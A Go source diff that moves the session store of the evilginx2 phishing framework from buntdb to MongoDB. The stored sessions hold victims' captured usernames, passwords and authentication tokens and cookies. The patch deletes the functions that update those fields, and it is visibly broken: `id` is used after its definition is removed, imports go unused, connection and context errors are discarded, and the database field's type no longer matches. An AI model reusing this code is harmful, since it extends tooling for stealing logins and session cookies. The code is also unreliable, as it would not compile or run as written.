@@ -1,11 +1,14 @@
 package database
 
 import (
+	"context"
 	"encoding/json"
 	"fmt"
 	"time"
 
-	"github.com/tidwall/buntdb"
+	"go.mongodb.org/mongo-driver/bson"
+	"go.mongodb.org/mongo-driver/mongo"
+	"go.mongodb.org/mongo-driver/mongo/options"
 )
 
 const SessionTable = "sessions"
@@ -35,17 +38,14 @@ type CookieToken struct {
 }
 
 func (d *Database) sessionsInit() {
-	d.db.CreateIndex("sessions_id", SessionTable+":*", buntdb.IndexJSON("id"))
-	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
+	ctx, _ := context.WithTimeout(context.Background(), 10*time.Second)
+	client, _ := mongo.Connect(ctx, options.Client().ApplyURI("mongodb://localhost:27017"))
+	d.db = client.Database("evilginx2")
 }
 
 func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
-	_, err := d.sessionsGetBySid(sid)
-	if err == nil {
-		return nil, fmt.Errorf("session already exists: %s", sid)
-	}
-
-	id, _ := d.getNextId(SessionTable)
+	collection := d.db.Collection("sessions")
+	ctx, _ := context.WithTimeout(context.Background(), 5*time.Second)
 
 	s := &Session{
 		Id:           id,
@@ -64,162 +64,71 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		UpdateTime:   time.Now().UTC().Unix(),
 	}
 
-	jf, _ := json.Marshal(s)
-
-	err = d.db.Update(func(tx *buntdb.Tx) error {
-		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
-		return nil
-	})
+	_, err := collection.InsertOne(ctx, s)
 	if err != nil {
 		return nil, err
 	}
+
 	return s, nil
 }
 
 func (d *Database) sessionsList() ([]*Session, error) {
-	sessions := []*Session{}
-	err := d.db.View(func(tx *buntdb.Tx) error {
-		tx.Ascend("sessions_id", func(key, val string) bool {
-			s := &Session{}
-			if err := json.Unmarshal([]byte(val), s); err == nil {
-				sessions = append(sessions, s)
-			}
-			return true
-		})
-		return nil
-	})
+	collection := d.db.Collection("sessions")
+	ctx, _ := context.WithTimeout(context.Background(), 30*time.Second)
+
+	cursor, err := collection.Find(ctx, bson.M{})
 	if err != nil {
 		return nil, err
 	}
+	defer cursor.Close(ctx)
+
+	var sessions []*Session
+	err = cursor.All(ctx, &sessions)
+	if err != nil {
+		return nil, err
+	}
+
 	return sessions, nil
 }
 
-func (d *Database) sessionsUpdateUsername(sid string, username string) error {
-	s, err := d.sessionsGetBySid(sid)
-	if err != nil {
-		return err
-	}
-	s.Username = username
-	s.UpdateTime = time.Now().UTC().Unix()
-
-	err = d.sessionsUpdate(s.Id, s)
-	return err
-}
-
-func (d *Database) sessionsUpdatePassword(sid string, password string) error {
-	s, err := d.sessionsGetBySid(sid)
-	if err != nil {
-		return err
-	}
-	s.Password = password
-	s.UpdateTime = time.Now().UTC().Unix()
-
-	err = d.sessionsUpdate(s.Id, s)
-	return err
-}
-
-func (d *Database) sessionsUpdateCustom(sid string, name string, value string) error {
-	s, err := d.sessionsGetBySid(sid)
-	if err != nil {
-		return err
-	}
-	s.Custom[name] = value
-	s.UpdateTime = time.Now().UTC().Unix()
-
-	err = d.sessionsUpdate(s.Id, s)
-	return err
-}
-
-func (d *Database) sessionsUpdateBodyTokens(sid string, tokens map[string]string) error {
-	s, err := d.sessionsGetBySid(sid)
-	if err != nil {
-		return err
-	}
-	s.BodyTokens = tokens
-	s.UpdateTime = time.Now().UTC().Unix()
-
-	err = d.sessionsUpdate(s.Id, s)
-	return err
-}
-
-func (d *Database) sessionsUpdateHttpTokens(sid string, tokens map[string]string) error {
-	s, err := d.sessionsGetBySid(sid)
-	if err != nil {
-		return err
-	}
-	s.HttpTokens = tokens
-	s.UpdateTime = time.Now().UTC().Unix()
-
-	err = d.sessionsUpdate(s.Id, s)
-	return err
-}
-
-func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
-	s, err := d.sessionsGetBySid(sid)
-	if err != nil {
-		return err
-	}
-	s.CookieTokens = tokens
-	s.UpdateTime = time.Now().UTC().Unix()
-
-	err = d.sessionsUpdate(s.Id, s)
-	return err
-}
-
 func (d *Database) sessionsUpdate(id int, s *Session) error {
-	jf, _ := json.Marshal(s)
+	collection := d.db.Collection("sessions")
+	ctx, _ := context.WithTimeout(context.Background(), 5*time.Second)
 
-	err := d.db.Update(func(tx *buntdb.Tx) error {
-		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
-		return nil
-	})
+	_, err := collection.UpdateOne(ctx, bson.M{"id": id}, bson.M{"$set": s})
 	return err
 }
 
 func (d *Database) sessionsDelete(id int) error {
-	err := d.db.Update(func(tx *buntdb.Tx) error {
-		_, err := tx.Delete(d.genIndex(SessionTable, id))
-		return err
-	})
+	collection := d.db.Collection("sessions")
+	ctx, _ := context.WithTimeout(context.Background(), 5*time.Second)
+
+	_, err := collection.DeleteOne(ctx, bson.M{"id": id})
 	return err
 }
 
 func (d *Database) sessionsGetById(id int) (*Session, error) {
-	s := &Session{}
-	err := d.db.View(func(tx *buntdb.Tx) error {
-		found := false
-		err := tx.AscendEqual("sessions_id", d.getPivot(map[string]int{"id": id}), func(key, val string) bool {
-			json.Unmarshal([]byte(val), s)
-			found = true
-			return false
-		})
-		if !found {
-			return fmt.Errorf("session ID not found: %d", id)
-		}
-		return err
-	})
+	collection := d.db.Collection("sessions")
+	ctx, _ := context.WithTimeout(context.Background(), 5*time.Second)
+
+	var s Session
+	err := collection.FindOne(ctx, bson.M{"id": id}).Decode(&s)
 	if err != nil {
 		return nil, err
 	}
-	return s, nil
+
+	return &s, nil
 }
 
 func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
-	s := &Session{}
-	err := d.db.View(func(tx *buntdb.Tx) error {
-		found := false
-		err := tx.AscendEqual("sessions_sid", d.getPivot(map[string]string{"session_id": sid}), func(key, val string) bool {
-			json.Unmarshal([]byte(val), s)
-			found = true
-			return false
-		})
-		if !found {
-			return fmt.Errorf("session not found: %s", sid)
-		}
-		return err
-	})
+	collection := d.db.Collection("sessions")
+	ctx, _ := context.WithTimeout(context.Background(), 5*time.Second)
+
+	var s Session
+	err := collection.FindOne(ctx, bson.M{"session_id": sid}).Decode(&s)
 	if err != nil {
 		return nil, err
 	}
-	return s, nil
+
+	return &s, nil
 }
